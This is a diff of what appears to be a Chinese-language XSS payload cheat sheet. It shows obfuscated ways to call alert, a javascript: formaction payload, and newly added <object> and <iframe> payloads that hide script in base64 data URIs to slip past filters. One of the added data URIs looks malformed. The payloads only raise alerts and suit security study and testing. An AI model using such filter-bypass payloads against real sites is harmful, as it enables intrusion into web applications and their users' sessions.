@@ -199,7 +199,7 @@ target="\_blank"属性是表明按照href的链接打开一个新窗口，当hre
 window["ale" + "rt"]("Hello, World!");
 
 eval("wind" + "ow.alert('Hello, World!');");
- 
+
 var obj = { ale: { rt: function(msg) { alert(msg); } } };
 obj["ale"]["rt"]("Hello, World!");
 
@@ -367,4 +367,11 @@ width="100" height="100">
 
 ```html
 <button formaction=javascript:alert(1)></button><!-- 试验过，单独无法触发xss，需配合input标签？ -->
+
+
+<!-- <frame> <object>等多重嵌套，iframe内即为<object> -->
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
+<iframe
+src="data:text/html;base64PG9iamVjdCBkYXRhPSJkYXRhOnRleHQvaHRtbDtiYXNlNjQsUEhOamNtbHdkRDVoYkdWeWRDZ3ZlSE56THlrOEwzTmpjbWx3ZEQ0PSI+PC9vYmplY3Q+=="
+></iframe>
 ```
